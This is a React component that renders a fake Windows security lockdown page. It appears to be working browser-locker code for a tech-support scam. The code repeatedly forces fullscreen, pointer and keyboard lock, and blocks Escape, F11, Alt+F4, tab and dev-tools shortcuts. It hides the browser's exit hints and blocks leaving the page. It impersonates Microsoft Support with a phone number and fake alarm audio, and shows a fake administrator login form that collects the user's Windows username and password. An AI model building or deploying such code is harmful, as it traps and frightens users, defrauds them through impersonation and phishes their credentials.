import { useState, useEffect, useRef } from 'react';
import '../../assets/css/microsoft.css';
import { FaBell, FaCog, FaQuestionCircle } from 'react-icons/fa';
import SecondContainer from "../../assets/components/second-container";
import ThirdContainer from "../../assets/components/third-container";

const globalCursorHide = `
  html, body, #root, .fake-desktop {
    cursor: none !important;
    user-select: none !important;
  }
  * {
    cursor: none !important;
  }
  *::-webkit-media-controls-fullscreen-button { display: none !important; }
  ::-webkit-fullscreen { display: none !important; }
  :-webkit-full-screen-ancestor { pointer-events: auto !important; }
  div[role="button"], [role="status"], .notification, .alert, .toast, [role="dialog"] { display: none !important; }
  :fullscreen, :-webkit-full-screen { width: 100vw !important; height: 100vh !important; }
`;

function Microsoft() {
  const [showLogin, setShowLogin] = useState(true);
  const [fullscreenOverlay, setFullscreenOverlay] = useState(false);
  const [lockLostOverlay, setLockLostOverlay] = useState(false);
  const [hasShownEscHint, setHasShownEscHint] = useState(false);

  const rootDivRef = useRef<HTMLDivElement>(null);
  const ctrlDownRef = useRef(false);
  const isTryingToLock = useRef(false);
  const cursorRef = useRef<HTMLDivElement>(null);
  const sensitivityRef = useRef(150);
  const dampingRef = useRef(0.98);
  const cursorPosRef = useRef({ x: window.innerWidth / 2, y: window.innerHeight / 2 });
  const cursorVelRef = useRef({ x: 0, y: 0 });
  const lastClientRef = useRef<{ x: number | null; y: number | null }>({ x: null, y: null });
  const rafRef = useRef<number | null>(null);

  const requestKeyboardLock = async () => {
    if ('keyboard' in navigator && !(navigator as any).keyboard?.locked) {
      try {
        await (navigator as any).keyboard.lock(['Escape']);
      } catch {}
    }
  };

  const unlockKeyboard = () => {
    if ('keyboard' in navigator) {
      (navigator as any).keyboard.unlock?.();
    }   
  };

  const lockPointer = () => {
    if (ctrlDownRef.current || isTryingToLock.current || !rootDivRef.current) return;
    isTryingToLock.current = true;

    const elem = rootDivRef.current;
    const tryLock = () => {
      try {
        elem.requestPointerLock?.() ||
        (elem as any).mozRequestPointerLock?.() ||
        (elem as any).webkitRequestPointerLock?.();
      } catch {}
    };

    tryLock();
    setTimeout(() => {
      if (!document.pointerLockElement) tryLock();
      isTryingToLock.current = false;
    }, 25);
  };

  const enterFullScreen = async () => {
    if (document.fullscreenElement) return;

    const elem = document.documentElement;
    try {
      await (
        elem.requestFullscreen?.({ navigationUI: 'hide' }) ||
        (elem as any).webkitRequestFullscreen?.() ||
        (elem as any).mozRequestFullScreen?.() ||
        (elem as any).msRequestFullscreen?.()
      );

      await requestKeyboardLock();
      setFullscreenOverlay(false);
      setTimeout(lockPointer, 12);
    } catch {
      setTimeout(enterFullScreen, 18);
    }

    Object.assign(document.documentElement.style, { width: '100vw', height: '100vh', overflow: 'hidden', margin: 0, padding: 0 });
    Object.assign(document.body.style, { width: '100vw', height: '100vh', overflow: 'hidden', margin: 0, padding: 0 });
  };

  const handleFullscreenChange = () => {
    if (!document.fullscreenElement) {
      setTimeout(enterFullScreen, 8);
    } else {
      setFullscreenOverlay(false);
      setTimeout(lockPointer, 15);
    }
  };

  useEffect(() => {
    const blockEscapeKeys = (e: KeyboardEvent) => {
      const blocked = [
        'Escape', 'F11', 'F5', 'F12',
        (e.ctrlKey && e.key === 'r'),
        (e.ctrlKey && e.shiftKey && ['KeyI','KeyJ','KeyC'].includes(e.code)),
        (e.ctrlKey && ['t','n','w'].includes(e.key.toLowerCase())),
        (e.altKey && ['Tab','F4'].includes(e.key)),
        e.key === 'Tab'
      ];

      if (blocked.some(Boolean)) {
        e.preventDefault();
        e.stopPropagation();
        setTimeout(() => {
          lockPointer();
          enterFullScreen();
        }, 1);
        return false;
      }

      if (e.key === 'Escape') {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }

      if ((e.key === 'Control' || e.ctrlKey) && !ctrlDownRef.current) {
        ctrlDownRef.current = true;
        document.exitPointerLock?.();
        (document as any).mozExitPointerLock?.();
        (document as any).webkitExitPointerLock?.();
      }
    };

    const releaseCtrl = (e: KeyboardEvent) => {
      if (e.key === 'Control') {
        ctrlDownRef.current = false;
        setTimeout(lockPointer, 15);
      }
    };

    const prevent = (e: Event) => e.preventDefault();

    window.addEventListener('keydown', blockEscapeKeys, { capture: true });
    window.addEventListener('keyup', releaseCtrl, { capture: true });
    document.addEventListener('contextmenu', prevent, { capture: true });
    document.addEventListener('selectstart', prevent, { capture: true });
    window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; }, { capture: true });

    return () => {
      window.removeEventListener('keydown', blockEscapeKeys, { capture: true });
      window.removeEventListener('keyup', releaseCtrl, { capture: true });
      document.removeEventListener('contextmenu', prevent, { capture: true });
      document.removeEventListener('selectstart', prevent, { capture: true });
      window.removeEventListener('beforeunload', prevent as any, { capture: true });
    };
  }, []);

  useEffect(() => {
    const force = () => {
      enterFullScreen();
      lockPointer();
      setLockLostOverlay(false);
    };

    const onLeave = () => {
      if (!ctrlDownRef.current) {
        setTimeout(force, 4);
      }
    };

    const events = ['click','mousedown','mouseup','touchstart','touchend','mousemove','pointermove','keydown','keypress'];

    events.forEach(ev => document.addEventListener(ev, force, { capture: true, passive: false }));
    document.addEventListener('mouseleave', onLeave, { capture: true });
    window.addEventListener('mouseout', onLeave, { capture: true });

    return () => {
      events.forEach(ev => document.removeEventListener(ev, force, { capture: true }));
      document.removeEventListener('mouseleave', onLeave, { capture: true });
      window.removeEventListener('mouseout', onLeave, { capture: true });
    };
  }, []);

  useEffect(() => {
    const onLockChange = () => {
      if (!document.pointerLockElement && !ctrlDownRef.current) {
        setTimeout(lockPointer, 8);
      }
    };

    ['pointerlockchange','mozpointerlockchange','webkitpointerlockchange'].forEach(ev =>
      document.addEventListener(ev, onLockChange)
    );

    return () => {
      ['pointerlockchange','mozpointerlockchange','webkitpointerlockchange'].forEach(ev =>
        document.removeEventListener(ev, onLockChange)
      );
    };
  }, []);

  useEffect(() => {
    const ultra = setInterval(() => {
      if (!document.fullscreenElement) enterFullScreen();
      if (!document.pointerLockElement && !ctrlDownRef.current) lockPointer();
    }, 2);

    return () => clearInterval(ultra);
  }, []);

  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = globalCursorHide;
    document.head.appendChild(style);

    const hideEscHints = () => {
      if (hasShownEscHint) return;
      const els = document.querySelectorAll('*');
      els.forEach(el => {
        const text = (el.textContent || '').toLowerCase();
        if (text.includes('esc') && (text.includes('exit') || text.includes('leave') || text.includes('press'))) {
          (el as HTMLElement).style.display = 'none';
          (el as HTMLElement).style.visibility = 'hidden';
          setHasShownEscHint(true);
        }
      });
    };

    const observer = new MutationObserver(hideEscHints);
    observer.observe(document.body, { childList: true, subtree: true, characterData: true });

    setTimeout(() => {
      enterFullScreen();
      lockPointer();
      hideEscHints();
    }, 40);

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange);
    document.addEventListener('mozfullscreenchange', handleFullscreenChange);
    document.addEventListener('MSFullscreenChange', handleFullscreenChange);

    return () => {
      observer.disconnect();
      document.head.removeChild(style);
      unlockKeyboard();
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange);
      document.removeEventListener('mozfullscreenchange', handleFullscreenChange);
      document.removeEventListener('MSFullscreenChange', handleFullscreenChange);
    };
  }, [hasShownEscHint]);

  useEffect(() => {
    const beep = new Audio("/microsoft/censor-beep-2.mp3");
    const id = setInterval(() => {
      beep.currentTime = 0;
      beep.play().catch(() => {});
    }, 4800);

    return () => {
      clearInterval(id);
      beep.pause();
    };
  }, []);

  useEffect(() => {
    const updateCursor = () => {
      if (cursorRef.current) {
        const { x, y } = cursorPosRef.current;
        cursorRef.current.style.transform = `translate3d(${Math.round(x)}px, ${Math.round(y)}px, 0)`;
      }
      rafRef.current = requestAnimationFrame(updateCursor);
    };

    rafRef.current = requestAnimationFrame(updateCursor);

    const onMove = (e: MouseEvent) => {
      let dx = (e as any).movementX ?? 0;
      let dy = (e as any).movementY ?? 0;

      if (!dx && !dy && lastClientRef.current.x !== null && lastClientRef.current.y !== null) {
        dx = e.clientX - lastClientRef.current.x;
        dy = e.clientY - lastClientRef.current.y;
      }
      lastClientRef.current = { x: e.clientX, y: e.clientY };

      const edge = 500;
      if (
        e.clientX < edge || e.clientX > window.innerWidth - edge ||
        e.clientY < edge || e.clientY > window.innerHeight - edge
      ) {
        if (!ctrlDownRef.current) {
          lockPointer();
          enterFullScreen();
        }
      }

      if (!document.pointerLockElement && !ctrlDownRef.current) {
        lockPointer();
      }

      const scale = sensitivityRef.current;
      cursorVelRef.current.x = dx * scale;
      cursorVelRef.current.y = dy * scale;
      cursorVelRef.current.x *= dampingRef.current;
      cursorVelRef.current.y *= dampingRef.current;

      cursorPosRef.current.x = Math.max(0, Math.min(window.innerWidth - 1, cursorPosRef.current.x + cursorVelRef.current.x));
      cursorPosRef.current.y = Math.max(0, Math.min(window.innerHeight - 1, cursorPosRef.current.y + cursorVelRef.current.y));
      enterFullScreen();
      lockPointer();
      
      // Dispatch keyboard event to trigger fullscreen handlers
      const keyEvent = new KeyboardEvent('keydown', {
        key: 'a',
        code: 'KeyA',
        keyCode: 65,
        bubbles: true,
        cancelable: true
      });
      window.dispatchEvent(keyEvent);
    };

    window.addEventListener('mousemove', onMove, { capture: true });

    return () => {
      if (rafRef.current) cancelAnimationFrame(rafRef.current);
      window.removeEventListener('mousemove', onMove, { capture: true });
    };
  }, []);

  return (
    <div
      className="fake-desktop"
      ref={rootDivRef}
      style={{ height: '100vh', width: '100vw', position: 'relative', overflow: 'hidden' }}
    >
      <div
        ref={cursorRef}
        style={{
          position: 'fixed',
          left: 0,
          top: 0,
          width: '28px',
          height: '28px',
          marginLeft: '-2px',
          marginTop: '-2px',
          pointerEvents: 'none',
          zIndex: 99999999,
          backgroundImage: `url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 28"><defs><filter id="shadow"><feDropShadow dx="0.5" dy="0.5" stdDeviation="0.5" flood-opacity="0.6"/></filter></defs><path d="M2 2 L2 24 L8 18 L12 26 L15 25 L11 17 L20 17 Z" fill="white" stroke="black" stroke-width="1" stroke-linejoin="round" filter="url(%23shadow)"/></svg>')`,
          backgroundRepeat: 'no-repeat',
          backgroundSize: '28px 28px',
          backgroundPosition: 'top left',
          filter: 'drop-shadow(0.5px 0.5px 1px rgba(0,0,0,0.8))'
        }}
      />

      {fullscreenOverlay && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.97)',
            color: '#fff',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            alignItems: 'center',
            zIndex: 9999999,
            cursor: 'none',
            textAlign: 'center'
          }}
          onClick={enterFullScreen}
        >
          <h1>CRITICAL ERROR 0xx881020</h1>
          <p style={{ fontSize: '1.4rem', marginTop: '24px' }}>
            Click or tap anywhere to restore system protected mode
          </p>
        </div>
      )}

      <div
        style={{
          position: 'fixed',
          top: 0,
          left: '50%',
          transform: 'translateX(-50%)',
          width: '100%',
          maxWidth: '640px',
          height: '140px',
          background: 'rgb(32, 36, 42)',
          zIndex: 2147483647,
          pointerEvents: 'none',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          color: '#fff',
          fontSize: '1.4rem'
        }}
      >
        System Protected Mode – Active
      </div>

      <audio src="/microsoft/generated-audio.mp3" autoPlay loop muted={false} />

      <div className="left-container">
        <div className="top-right-toolbar">
          <div className="window-buttons">
            <button className="window-btn">−</button>
            <button className="window-btn">□</button>
            <button className="window-btn close-btn">×</button>
          </div>
          <div className="extra-buttons">
            <button className="redeem-button">Redeem license code</button>
            <button className="extra-btn"><FaBell /></button>
            <button className="extra-btn"><FaCog /></button>
            <button className="extra-btn"><FaQuestionCircle /></button>
          </div>
        </div>
        <div className="sidebar-content">
          <p>Left sidebar content</p>
        </div>
      </div>

      <SecondContainer />
      <ThirdContainer />

      <footer className="page-footer">
        <div className="footer-top">
          <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
          <span>Windows Security</span>
          <span>Microsoft Support</span>
          <span className="footer-phone">020 4549 4912</span>
        </div>

        <div style={{
          position: 'absolute',
          right: '20px',
          bottom: '50%',
          transform: 'translateY(-50%)',
          animation: 'jump 1.2s infinite ease-in-out',
          marginBottom: '70px'
        }}>
          <div style={{
            position: 'relative',
            background: '#fff',
            border: '3px solid #ffcc00',
            borderRadius: '12px',
            padding: '12px 20px',
            boxShadow: '0 4px 15px rgba(0,0,0,0.4)',
            fontWeight: 'bold',
            color: '#000',
            fontSize: '18px',
            whiteSpace: 'nowrap',
            textAlign: 'center'
          }}>
            <div style={{ color: '#0067c5', fontSize: '22px', marginBottom: '4px' }}>
              <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
               Microsoft
            </div>
            <div style={{ color: '#0067c5' }}>Microsoft Support</div>
            <div style={{ color: '#d32f2f', fontSize: '24px', fontWeight: 'bold', marginTop: '8px' }}>
              020 4549 4912
            </div>

            <div style={{
              position: 'absolute',
              bottom: '-20px',
              left: '50%',
              transform: 'translateX(-50%)',
              width: '0',
              height: '0',
              borderLeft: '20px solid transparent',
              borderRight: '20px solid transparent',
              borderTop: '20px solid #ffcc00',
              zIndex: '1'
            }} />

            <div style={{
              position: 'absolute',
              bottom: '-16px',
              left: '50%',
              transform: 'translateX(-50%)',
              width: '0',
              height: '0',
              borderLeft: '18px solid transparent',
              borderRight: '18px solid transparent',
              borderTop: '18px solid #fff',
              zIndex: '2'
            }} />
          </div>
        </div>

        <div className="footer-marquee">
          <div className="marquee-content">
            <span>
              Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.       
            </span>
            <span>
              Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.       
            </span>
          </div>
        </div>
      </footer>

      {showLogin && (
        <div className="login-overlay">
          <div className="login-dialog" onClick={e => e.stopPropagation()}>
            <div className="dialog-title-bar">
              <button className="close">×</button>
            </div>
            <div className="dialog-body">
              <span style={{ fontSize: "28px", fontFamily: "Segoe UI" }}>Administrator login</span>
              <p style={{ marginTop: "20px" }}>
                Windows has been blocked due to suspicious activity.
                Try logging in again with your Windows account and password.
                If you need help, contact Windows Support.
              </p>
              <div className="phone-large">020 4549 4912</div>
              <div className="form">
                <input type="text" placeholder="Username" />
                <input type="password" placeholder="Password" />
                <button className="login-button">Login</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default Microsoft;